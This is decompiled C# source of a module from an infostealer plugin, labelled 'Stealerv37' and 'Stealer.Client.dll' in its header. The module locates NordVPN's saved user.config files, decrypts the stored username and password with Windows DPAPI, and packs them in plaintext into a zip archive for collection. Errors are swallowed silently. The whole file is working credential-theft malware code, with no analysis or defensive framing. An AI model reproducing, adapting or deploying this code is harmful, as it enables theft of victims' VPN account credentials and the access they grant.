// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.NordVpn
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

#nullable disable
namespace Intelix.Targets.Vpn;

public class NordVpn : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
    if (!directoryInfo.Exists)
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "NordVPN";
    try
    {
      foreach (DirectoryInfo directory1 in directoryInfo.GetDirectories("NordVpn.exe*"))
      {
        List<string> values = new List<string>();
        foreach (FileSystemInfo directory2 in directory1.GetDirectories())
        {
          string str1 = Path.Combine(directory2.FullName, "user.config");
          if (File.Exists(str1))
          {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.Load(str1);
            string str2 = NordVpn.Decode(xmlDocument.SelectSingleNode("//setting[@name='Username']/value")?.InnerText);
            string str3 = NordVpn.Decode(xmlDocument.SelectSingleNode("//setting[@name='Password']/value")?.InnerText);
            if (!string.IsNullOrEmpty(str2) && !string.IsNullOrEmpty(str3))
              values.Add($"Username: {str2}\nPassword: {str3}");
          }
        }
        if (values.Count > 0)
        {
          string entryPath = Path.Combine("NordVPN", directory1.Name, "accounts.txt");
          counterApplications.Files.Add(directory1.FullName + " => NordVPN\\");
          counterApplications.Files.Add("NordVPN\\");
          zip.AddTextFile(entryPath, string.Join("\n\n", (IEnumerable<string>) values));
        }
      }
    }
    catch
    {
    }
    counterApplications.Files.Add("NordVPN\\");
    counter.Vpns.Add(counterApplications);
  }

  private static string Decode(string s)
  {
    return Encoding.UTF8.GetString(DpApi.Decrypt(Convert.FromBase64String(s))) ?? "";
  }
}
